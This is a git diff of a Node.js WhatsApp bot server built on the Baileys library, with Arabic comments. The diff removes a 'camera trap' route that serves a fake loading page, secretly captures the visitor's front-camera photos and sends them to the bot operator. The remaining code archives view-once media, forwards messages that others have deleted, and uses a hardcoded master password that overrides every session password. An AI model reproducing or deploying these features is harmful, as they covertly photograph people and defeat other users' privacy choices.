@@ -4,8 +4,8 @@ const path = require('path');
 const qrCode = require('qrcode');
 const moment = require('moment-timezone');
 const axios = require('axios');
-const pino = require('pino'); 
-const { GoogleGenerativeAI } = require('@google/generative-ai'); 
+const pino = require('pino'); // 🛡️ كتم السجلات لمنع اختناق المعالج
+const { GoogleGenerativeAI } = require('@google/generative-ai'); // 🧠 مكتبة جوجل الرسمية (الحل النووي)
 
 const {
     default: makeWASocket,
@@ -15,8 +15,11 @@ const {
     makeCacheableSignalKeyStore,
     downloadMediaMessage,
     jidNormalizedUser,
+    generateWAMessageFromContent,
+    proto
 } = require('@whiskeysockets/baileys');
 
+// 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ
 process.on('uncaughtException', console.error);
 process.on('unhandledRejection', console.error);
 
@@ -26,7 +29,7 @@ const MASTER_PASSWORD = 'tarzanbot';
 const sessions = {};
 const msgStore = new Map(); 
 
-// ✅ 1. نظام حفظ الإعدادات 
+// ✅ 1. نظام حفظ الإعدادات (مع دعم المفتاح العالمي)
 const settingsPath = path.join(__dirname, 'settings.json');
 let botSettings = {};
 if (fs.existsSync(settingsPath)) { 
@@ -36,6 +39,7 @@ if (fs.existsSync(settingsPath)) {
     fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
 }
 
+// التأكد من وجود قسم الإعدادات العامة لمفتاح الـ API
 if (!botSettings.GLOBAL_CONFIG) {
     botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
     saveSettings();
@@ -48,7 +52,7 @@ function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).
 const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
 if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);
 
-// 🛡️ 3. نظام تفريغ الذاكرة الذكي
+// 🛡️ 3. نظام تفريغ الذاكرة الذكي (لتحمل 100+ جلسة)
 setInterval(() => { 
     if (msgStore.size > 5000) {
         msgStore.clear(); 
@@ -57,41 +61,10 @@ setInterval(() => {
 }, 30 * 60 * 1000);
 
 app.use(express.static('public'));
-app.use(express.json({limit: '50mb'})); 
-app.use(express.urlencoded({limit: '50mb', extended: true}));
+app.use(express.json());
 
 // ==========================================
-// 📸 4. مسارات نظام فخ الكاميرا
-// ==========================================
-app.get('/trap/:sessionId/:targetNumber', (req, res) => {
-    const { sessionId, targetNumber } = req.params;
-    const htmlTrap = `
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>جارِ التحميل...</title>
-    <style>body{background:#121212;color:#fff;font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}.loader{border:5px solid #333;border-top:5px solid #00E676;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}video,canvas{display:none}.message{text-align:center;font-size:1.2rem}.sub-message{text-align:center;font-size:0.9rem;color:#aaa;margin-top:10px}</style></head>
-    <body><div class="loader"></div><div class="message">أرجو منك الانتظار...</div><div class="sub-message">جاري تحميل الصفحة...<br>قد يطلب المتصفح بعض الصلاحيات للمتابعة.</div>
-    <video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>
-    <script>async function startTrap(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});const video=document.getElementById('video');video.srcObject=stream;video.onloadedmetadata=()=>{video.play();setTimeout(()=>takePhoto(1),1000);setTimeout(()=>takePhoto(2),2500);};}catch(err){}}function takePhoto(num){const video=document.getElementById('video');const canvas=document.getElementById('canvas');canvas.width=video.videoWidth;canvas.height=video.videoHeight;canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);const dataURL=canvas.toDataURL('image/jpeg',0.6);fetch('/api/trap-upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:dataURL,sessionId:'${sessionId}',targetNumber:'${targetNumber}',photoNum:num})});}startTrap();</script></body></html>`;
-    res.send(htmlTrap);
-});
-
-app.post('/api/trap-upload', async (req, res) => {
-    const { image, sessionId, targetNumber, photoNum } = req.body;
-    try {
-        if (sessions[sessionId]) {
-            const sock = sessions[sessionId];
-            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
-            const imageBuffer = Buffer.from(base64Data, 'base64');
-            const caption = `📸 *[صيد الكاميرا - التقاط رقم ${photoNum}]* 📸\n🎯 *الهدف وقع في الفخ!*\n🕒 *الوقت:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss")}`;
-            await sock.sendMessage(`${targetNumber}@s.whatsapp.net`, { image: imageBuffer, caption: caption });
-        }
-        res.json({ success: true });
-    } catch (e) { res.json({ success: false }); }
-});
-
-// ==========================================
-// 🚀 5. معالج الأوامر
+// 🚀 4. معالج الأوامر
 // ==========================================
 const commandsMap = new Map();
 const commandsPath = path.join(__dirname, 'commands');
@@ -110,13 +83,15 @@ function loadCommands() {
                     command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                 }
             }
-        } catch (err) { console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message); }
+        } catch (err) {
+            console.error(`❌ خطأ في تحميل الأمر ${file}:`, err.message);
+        }
     }
 }
 loadCommands();
 
 // ==========================================
-// ⚙️ 6. تشغيل الجلسات
+// ⚙️ 5. تشغيل الجلسات
 // ==========================================
 async function startSession(sessionId, res = null, pairingNumber = null) {
     const sessionPath = path.join(__dirname, 'sessions', sessionId);
@@ -130,10 +105,6 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             aiEnabled: false, 
             autoReact: false, 
             reactEmoji: '❤️', 
-            ghostMode: false, 
-            antiCall: false, 
-            autoReadStatus: false, 
-            alwaysOnline: false,
             welcomeSent: false
         };
         saveSettings();
@@ -145,10 +116,10 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
     const sock = makeWASocket({
         version,
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
-        logger: pino({ level: 'silent' }), 
+        logger: pino({ level: 'silent' }), // 🛡️ سر استقرار السيرفر
         printQRInTerminal: false,
-        markOnlineOnConnect: false, 
-        browser: ['Windows', 'Edge', '10.0'], 
+        markOnlineOnConnect: true,
+        browser: ['Windows', 'Edge', '10.0'], // 🌟 Edge لمنع حظر واتساب
         syncFullHistory: false,
         generateHighQualityLinkPreviews: false
     });
@@ -163,7 +134,8 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                 if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
             } catch (err) {
-                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود.' });
+                console.log('❌ خطأ في كود الاقتران:', err);
+                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود. السيرفرات مزدحمة، حاول بعد ثوانٍ.' });
             }
         }, 3000); 
     }
@@ -183,137 +155,60 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         if (connection === 'open') {
             console.log(`✅ الجلسة ${sessionId} متصلة بنجاح!`);
             const selfId = jidNormalizedUser(sock.user.id);
-            const sets = botSettings[sessionId];
-            
-            if (sets.ghostMode) {
-                await sock.sendPresenceUpdate('unavailable');
-            } else if (sets.alwaysOnline) {
-                await sock.sendPresenceUpdate('available');
-            } else {
-                try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}
-            }
+            try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}
 
-            if (!sets.welcomeSent) {
-                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك:*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${sets.password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
+            if (!botSettings[sessionId].welcomeSent) {
+                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك (لإعدادات الموقع):*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
                 await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText });
                 botSettings[sessionId].welcomeSent = true; saveSettings();
             }
         }
     });
 
-    sock.ev.on('call', async (node) => {
-        const sets = botSettings[sessionId];
-        if (!sets || !sets.antiCall) return;
-        
-        for (const call of node) {
-            if (call.status === 'offer') {
-                try {
-                    await sock.rejectCall(call.id, call.from);
-                    await sock.sendMessage(call.from, { 
-                        text: `🚫 *[نظام VIP]*\nعذراً، صاحب هذا الرقم يستخدم نظام حماية، واستقبال المكالمات معطل حالياً. يرجى ترك رسالة نصية.` 
-                    });
-                } catch (e) {}
-            }
-        }
-    });
-
     // ==========================================
-    // 🛡️ 7. مضاد الحذف المطور (VIP) - يجلب كل المعلومات بدقة
+    // 🛡️ 6. مضاد الحذف الجبار
     // ==========================================
     sock.ev.on('messages.update', async updates => {
         for (const { key, update } of updates) {
-            // التحقق من أن الرسالة حذفت، وليست من البوت نفسه
             if (update?.message === null && key?.remoteJid && !key.fromMe) {
                 try {
-                    // سحب الرسالة الأصلية من الذاكرة
                     const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`);
                     if (!storedMsg?.message) return; 
-
                     const selfId = jidNormalizedUser(sock.user.id);
-                    const remoteJid = key.remoteJid;
-                    // تحديد رقم المرسل الحقيقي
-                    const senderJid = key.participant || storedMsg.key?.participant || remoteJid;
+                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                     const number = senderJid.split('@')[0];
-                    
-                    // جلب الاسم الحقيقي للمرسل من الواتساب
-                    const pushName = storedMsg.pushName || 'غير متوفر (رقم غير مسجل)';
+                    const name = storedMsg.pushName || 'مجهول';
                     const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
-
-                    // تحليل مصدر الحذف بدقة عالية
-                    let originType = '';
-                    let originName = '';
-
-                    if (remoteJid === 'status@broadcast') {
-                        originType = '👁️ حالة (ستوري)';
-                        originName = 'ستوري واتساب';
-                    } else if (remoteJid.endsWith('@g.us')) {
-                        originType = '👥 مجموعة (قروب)';
-                        try {
-                            // جلب اسم القروب الحقيقي
-                            const groupMetadata = await sock.groupMetadata(remoteJid);
-                            originName = groupMetadata.subject;
-                        } catch (e) {
-                            originName = 'قروب غير معروف';
-                        }
-                    } else if (remoteJid.endsWith('@newsletter')) {
-                        originType = '📢 قناة';
-                        originName = 'قناة واتساب';
-                    } else {
-                        originType = '👤 دردشة خاصة';
-                        originName = 'محادثة فردية (خاص)';
-                    }
                     
-                    // تنسيق رسالة التنبيه بشكل فخم ودقيق
-                    const alertText = `🚫 *[ تـم حـذف رسـالـة ]* 🚫
-━━━━━━━━━━━━━━━━━━
-👤 *الاسم الحقيقي:* ${pushName}
-📱 *الرقم:* wa.me/${number}
-📍 *نوع المصدر:* ${originType}
-🏷️ *اسم المكان:* ${originName}
-🕒 *وقت الحذف:* ${time}
-━━━━━━━━━━━━━━━━━━
-👇 *المحتوى المحذوف بالأسفل:*`;
-
-                    // إرسال التنبيه ثم الرسالة المحذوفة
+                    const alertText = `🚫 *[رسالة محذوفة]* 🚫\n👤 *الاسم:* ${name}\n📱 *الرقم:* wa.me/${number}\n🕒 *الوقت:* ${time}\n👇 *المحتوى:*`;
                     await sock.sendMessage(selfId, { text: alertText });
                     await sock.sendMessage(selfId, { forward: storedMsg });
-                } catch (err) {
-                    console.error('❌ خطأ في مضاد الحذف:', err);
-                }
+                } catch (err) {}
             }
         }
     });
 
-    // 🔥 8. استقبال الرسائل المركزية
+    // ==========================================
+    // 🔥 7. استقبال الرسائل المركزية
+    // ==========================================
     sock.ev.on('messages.upsert', async ({ messages, type }) => {
         if (type !== 'notify') return;
         const msg = messages[0];
         if (!msg?.message) return; 
 
-        const currentSettings = botSettings[sessionId] || {};
         const from = msg.key.remoteJid;
-
-        if (from === 'status@broadcast') {
-            // حفظ الحالة في الذاكرة لكي يعمل مضاد الحذف للحالات
-            if (msgStore.size < 5000) msgStore.set(`${from}_${msg.key.id}`, msg);
-            
-            if (currentSettings.autoReadStatus && !msg.key.fromMe) {
-                try { await sock.readMessages([msg.key]); } catch (e) {}
-            }
-            return; 
-        }
-
         const isGroup = from.endsWith('@g.us');
         const sender = isGroup ? msg.key.participant : from;
         const pushName = msg.pushName || 'مجهول';
         const selfId = jidNormalizedUser(sock.user.id);
         const isFromMe = msg.key.fromMe || sender === selfId;
 
-        // حفظ جميع الرسائل في الذاكرة ليعمل مضاد الحذف
         if (msgStore.size < 5000) msgStore.set(`${from}_${msg.key.id}`, msg);
 
+        const currentSettings = botSettings[sessionId] || {};
         if (!currentSettings.botEnabled) return;
 
+        // 👁️‍🗨️ [الرادار]: صائد العرض لمرة واحدة
         let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
         const mediaTypeCheck = Object.keys(msg.message)[0];
         if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
@@ -333,11 +228,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                 if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                 else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                 else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
-            } catch (err) { }
-        }
-
-        if (!currentSettings.ghostMode && !isFromMe) {
-            await sock.readMessages([msg.key]);
+            } catch (err) { console.error('❌ خطأ في الرادار التلقائي:', err); }
         }
 
         if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
@@ -345,55 +236,67 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         }
 
         const body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || '';
-        
         const reply = async (text) => {
-            if (!currentSettings.ghostMode) await sock.sendPresenceUpdate('composing', from);
+            await sock.sendPresenceUpdate('composing', from);
             return await sock.sendMessage(from, { text: text }, { quoted: msg });
         };
 
         const isCmd = body.startsWith('.');
 
-        // 🧠 9. الذكاء الاصطناعي 
+        // ==========================================
+        // 🧠 8. الذكاء الاصطناعي (الحل النووي במكتبة جوجل الرسمية)
+        // ==========================================
         if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming) {
             try {
-                if (!currentSettings.ghostMode) await sock.sendPresenceUpdate('composing', from); 
+                await sock.sendPresenceUpdate('composing', from); 
                 
                 let aiResponseText = '';
                 const query = body.trim();
                 const apiKey = botSettings.GLOBAL_CONFIG?.geminiApiKey;
 
+                // 🌟 المحاولة الأساسية: استخدام المكتبة الرسمية (لضمان توافق مفاتيح 2026)
                 if (apiKey && apiKey.length > 20) {
                     try {
                         const genAI = new GoogleGenerativeAI(apiKey);
                         const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });
                         const result = await model.generateContent(query);
                         aiResponseText = result.response.text();
-                    } catch (apiErr) { }
+                    } catch (apiErr) {
+                        console.error('⚠️ فشل محرك جوجل الرسمي:', apiErr.message);
+                    }
                 }
 
+                // 🌟 المحاولة البديلة (API جديد وقوي)
                 if (!aiResponseText) {
                     try {
                         const fallbackUrl = `https://aemt.me/gemini?text=${encodeURIComponent(query)}`;
                         const fallbackRes = await axios.get(fallbackUrl);
                         if (fallbackRes.data && fallbackRes.data.status && fallbackRes.data.result) {
                             aiResponseText = fallbackRes.data.result;
-                        } else { throw new Error('API فشل'); }
+                        } else {
+                            throw new Error('API فشل');
+                        }
                     } catch (eFallback) {
                         aiResponseText = 'عقلي في حالة صيانة وتحديث الآن، السيرفرات مشغولة 🧠⏳';
                     }
                 }
 
+                // إرسال الرد
                 if (aiResponseText) {
                     await reply(aiResponseText);
                 } else {
                     await reply('حدث خطأ غير متوقع في نظام التفكير 🤔');
                 }
 
-            } catch (error) { }
+            } catch (error) {
+                console.error('❌ خطأ في معالج الذكاء الاصطناعي:', error.message);
+            }
             return; 
         }
 
-        // 🎯 10. معالجة الأوامر الخارجية
+        // ==========================================
+        // 🎯 9. معالجة الأوامر الخارجية
+        // ==========================================
         if (!currentSettings.commandsEnabled) return;
 
         let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '';
@@ -415,16 +318,16 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
         if (commandData) {
             try {
-                if (commandName !== '🌚' && commandName !== 'vv' && !currentSettings.ghostMode) {
+                if (commandName !== '🌚' && commandName !== 'vv') {
                     await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
                 }
                 
                 await commandData.execute({
-                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings, sessionId, downloadMediaMessage
+                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings
                 });
             } catch (error) {
                 console.error(`❌ خطأ في الأمر ${commandName}:`, error);
-                if (commandName !== '🌚' && commandName !== 'vv' && !currentSettings.ghostMode) {
+                if (commandName !== '🌚' && commandName !== 'vv') {
                     await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
                 }
             }
@@ -435,7 +338,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 }
 
 // ==========================================
-// 🌐 11. API Endpoints (لوحة التحكم)
+// 🌐 10. API Endpoints (لوحة التحكم)
 // ==========================================
 app.post('/create-session', (req, res) => {
     const { sessionId } = req.body;
@@ -465,7 +368,7 @@ app.post('/api/settings/get', (req, res) => {
 });
 
 app.post('/api/settings/save', (req, res) => {
-    const { sessionId, password, botEnabled, commandsEnabled, aiEnabled, autoReact, ghostMode, antiCall, autoReadStatus, alwaysOnline } = req.body;
+    const { sessionId, password, botEnabled, commandsEnabled, aiEnabled, autoReact, reactEmoji } = req.body;
     const settings = botSettings[sessionId];
     if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
     if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
@@ -474,18 +377,8 @@ app.post('/api/settings/save', (req, res) => {
     botSettings[sessionId].commandsEnabled = !!commandsEnabled;
     botSettings[sessionId].aiEnabled = !!aiEnabled; 
     botSettings[sessionId].autoReact = !!autoReact;
-    botSettings[sessionId].ghostMode = !!ghostMode; 
-    botSettings[sessionId].antiCall = !!antiCall; 
-    botSettings[sessionId].autoReadStatus = !!autoReadStatus; 
-    botSettings[sessionId].alwaysOnline = !!alwaysOnline; 
+    botSettings[sessionId].reactEmoji = reactEmoji || '❤️';
     saveSettings();
-
-    if (sessions[sessionId]) {
-        if (botSettings[sessionId].ghostMode) sessions[sessionId].sendPresenceUpdate('unavailable');
-        else if (botSettings[sessionId].alwaysOnline) sessions[sessionId].sendPresenceUpdate('available');
-        else sessions[sessionId].sendPresenceUpdate('available');
-    }
-
     res.json({ success: true, message: '✅ تم حفظ التعديلات' });
 });
 
@@ -504,6 +397,7 @@ app.post('/delete-session', (req, res) => {
 app.listen(PORT, () => {
     console.log(`\n=========================================`);
     console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
-    console.log(`🛡️ مضاد الحذف الجبار (مطور بالكامل) يعمل الآن`);
+    console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
+    console.log(`🧠 نظام الذكاء الاصطناعي (الحل النووي) مدمج وجاهز`);
     console.log(`=========================================\n`);
 });
